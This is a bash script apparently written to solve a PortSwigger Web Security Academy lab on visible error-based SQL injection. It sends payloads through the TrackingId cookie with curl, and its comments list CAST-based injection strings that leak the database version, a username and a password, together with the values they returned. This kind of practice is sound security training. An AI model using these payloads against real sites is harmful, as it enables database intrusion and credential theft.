#!/bin/bash
#visible_error-based.sh "' AND 1=CAST((SELECT version()) AS int)--" #result: PostgreSQL 12.17 (Ubuntu 12.17-0ubuntu0.20.04.1) 
#visible_error-based.sh "' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--" #result: 'administrator'
#visible_error-based.sh "' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--" #result: 'a54uwf40obj3it4ulo0i'
payload=$1
portswiggerid="0a6f004404bf3d8a803167ce00e40090"
url="https://${portswiggerid}.web-security-academy.net/filter?category=Gifts"


curl -L -k --compressed -X "GET" -H $'Host: 0a6f004404bf3d8a803167ce00e40090.web-security-academy.net' \
        -A 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36' \
        -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
        -H $'Referer: https://0a6f004404bf3d8a803167ce00e40090.web-security-academy.net/filter?category=Gifts' \
        -H $'Accept-Encoding: gzip, deflate, br' -H $'Accept-Language: en-US,en;q=0.9' -H $'Connection: close' \
        -b "TrackingId=${payload}; session=WRmsXnpvyUEk9BUBjuzZBX7TqtZv0heM" "${url}" 2>/dev/null | xmllint --html --xpath "string(//h4)" - 2>/dev/null
